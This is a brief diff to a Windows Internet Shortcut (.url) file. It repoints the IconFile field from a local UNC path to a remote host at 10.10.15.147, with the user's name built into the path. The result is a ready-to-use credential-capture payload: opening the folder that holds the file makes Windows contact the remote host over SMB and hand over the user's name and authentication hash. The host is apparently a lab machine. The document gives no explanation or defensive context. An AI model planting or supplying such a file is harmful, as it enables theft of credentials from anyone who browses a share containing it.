@@ -1,5 +1,5 @@
 [InternetShortcut]
 URL=whatever
 WorkingDirectory=whatever
-IconFile=\\127.0.0.1\%USERNAME%.icon
+IconFile=\\10.10.15.147\%USERNAME%.icon
 IconIndex=1
